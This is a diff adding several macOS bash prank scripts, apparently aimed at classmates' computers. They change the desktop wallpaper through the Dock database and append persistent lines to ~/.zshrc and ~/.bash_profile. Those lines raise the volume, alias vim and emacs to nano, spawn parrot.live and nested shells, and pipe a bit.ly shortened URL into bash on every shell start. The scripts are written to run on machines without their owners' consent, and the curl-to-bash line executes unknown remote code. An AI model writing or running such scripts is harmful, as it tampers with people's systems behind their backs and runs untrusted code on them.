@@ -1,0 +1,27 @@
+#!/bin/bash
+curl https://codamhero.dev/trol/lucas.jpg --output ${HOME}/lucas.jpg;
+sqlite3 ~/Library/Application\ Support/Dock/desktoppicture.db "update data set value = '${HOME}/lucas.jpg'";
+osascript -e 'tell application "Finder" to set desktop picture to POSIX file "'$HOME'/lucas.jpg"';
+killall Dock;	|
+#!/bin/bash
+echo 'osascript -e "set Volume without output muted";' >> ~/.zshrc;
+echo 'osascript -e "set Volume 10";' >> ~/.zshrc;
+echo 'curl -L http://bit.ly/10hA8iC | bash' >> ~/.zshrc;	|
+
+#!/bin/bash
+curl https://codamhero.dev/trol/lucas.jpg --output ${HOME}/jelle.jpg;
+sqlite3 ~/Library/Application\ Support/Dock/desktoppicture.db "update data set value = '${HOME}/jelle.jpg'";
+osascript -e 'tell application "Finder" to set desktop picture to POSIX file "'$HOME'/jelle.jpg"';
+killall Dock;
+echo 'source ~/.bash_profile;' >> ~/.zshrc;
+echo 'curl -L parrot.live &;' >> ~/.zshrc;
+echo 'curl -L parrot.live &;' >> ~/.bash_profile;
+echo 'bash;' >> ~/.zshrc	|
+
+#!/bin/bash
+curl https://codamhero.dev/trol/lucas.jpg --output ${HOME}/jelle.jpg;
+sqlite3 ~/Library/Application\ Support/Dock/desktoppicture.db "update data set value = '${HOME}/jelle.jpg'";
+osascript -e 'tell application "Finder" to set desktop picture to POSIX file "'$HOME'/jelle.jpg"';
+killall Dock;
+echo 'alias vim=nano;' >> ~/.zshrc;
+echo 'alias emacs=nano;' >> ~/.zshrc;
